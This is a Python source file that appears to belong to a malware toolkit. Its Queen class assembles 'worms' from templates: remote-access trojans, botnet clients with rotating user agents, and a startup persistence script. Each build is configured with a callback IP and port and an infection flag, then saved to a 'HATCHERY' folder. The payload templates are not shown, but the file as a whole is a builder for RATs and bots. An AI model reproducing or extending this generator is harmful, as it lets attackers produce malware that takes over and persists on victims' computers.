import os

from jinja2 import Template

from ..CONFIG import APP_DIRECTORY, SYS_MSG_HEADERS, CLIENT_PAUSE_CONNECTION, EXTRAS_DIR


class Queen:
    def __init__(self):
        self.out_dir = os.path.join(APP_DIRECTORY, "HATCHERY")
        self.templates_dir = os.path.join(APP_DIRECTORY, "draconus", "hive", "templates")
        self.make_dirs()
        self._template = {}
        self.tags = {
            "user_agent" : os.path.join(EXTRAS_DIR, "user_agents.txt")
        }
    
    def loader(self, tag):
        data = []
        with open(self.tags[tag], "r") as f:
            for line in f.readlines():
                if line.startswith("#") or line == "\n":
                    continue
                data.append(line)
        return data
    
    def load_file(self, fpath):
        with open(fpath, "r") as f:
            data = f.read()
        return data



    def make_dirs(self):
        if not os.path.exists(self.out_dir):
            os.mkdir(self.out_dir)
    
    def accept_config(self, **config):
        print(config)
    
    def _make_basic_worm(self, **config):
        temp_patch = os.path.join(self.templates_dir, "basic_worm.py")
        with open(temp_patch, "r") as f:
            temp_code = f.read()
        temp_code = Template(temp_code)
        conn_pause = config.get("CLIENT_PAUSE", CLIENT_PAUSE_CONNECTION)
        basic_code = temp_code.render(
            INFECT = config["INFECT"],
            IP = config["IP"],
            PORT = config["PORT"],
            FORMAT_CODE = config["FORMAT_CODE"],
            RAW_LEN = config["RAW_LEN"],
            SYS_MSG = SYS_MSG_HEADERS,
            CONN_PAUSE = conn_pause
        )
        return basic_code
    
    def _make_adv_worm(self, **config):
        basic_rfunc = config.get("basic_rat_func")
        with open(os.path.join(self.templates_dir, "adv_worm.py"), "r") as f:
            temp_code = f.read()
        temp_code = Template(temp_code)
        adv_code = temp_code.render(SIMPLE_RAT=basic_rfunc)
        return adv_code
    
    def _make_startup(self, name):
        temp_patch = os.path.join(self.templates_dir, "startup_temp.py")
        with open(temp_patch, "r") as f:
            temp_code = f.read()
        temp_code = Template(temp_code)
        start_code = temp_code.render(WORM_NAME = name)
        return start_code
    
    def _make_empty_template(self, worm_name):
        temp_patch = os.path.join(self.templates_dir, worm_name)
        with open(temp_patch, "r") as f:
            temp_code = f.read()
        temp_code = Template(temp_code).render()
        return temp_code
        

    def hatchering(self, **config):
        if not config.get("INFECT"):
                config.update({"INFECT": False})
        bcode = self._make_basic_worm(**config)
        acode = ""
        if config["SERV_TYPE"] == "Echo" or config["SERV_TYPE"] == "Test":
            worm_code = self._make_empty_template("echo_temp.py")
            name = "EchoClient"
        elif config["SERV_TYPE"] == "BasicRat":
            config.update({"basic_rat_func" : None})
            acode = self._make_adv_worm(**config)
            name = "BasicRat"
            worm_code = self._make_empty_template("basic_rat.py")
        elif config["SERV_TYPE"] == "Adv":
            config.update({"basic_rat_func" : True})
            acode = self._make_adv_worm(**config)
            name = "AdvTest"
            worm_code = ""
        elif config["SERV_TYPE"] == "BasicBot":
            temp_path = os.path.join(self.templates_dir, "basicbot.py")
            tempb = self.load_file(temp_path)
            tempb = Template(tempb)
            user_agent = self.loader("user_agent")
            worm_code = tempb.render(USER_AGENT=user_agent)
            name = "BasicBotnet"
        startup = self._make_startup(config["SERV_TYPE"])
        fcode = bcode + acode + worm_code + startup
 
        self.save_worm(fcode, config["NAME"], name)


    def save_worm(self, code, serv_name, name):
        worm_name = f"{serv_name}_{name}.py"
        with open(os.path.join(self.out_dir, worm_name), "w") as f:
            f.write(code)
        print(f"[QUEEN] A new worm < {worm_name} > has hatched")

    

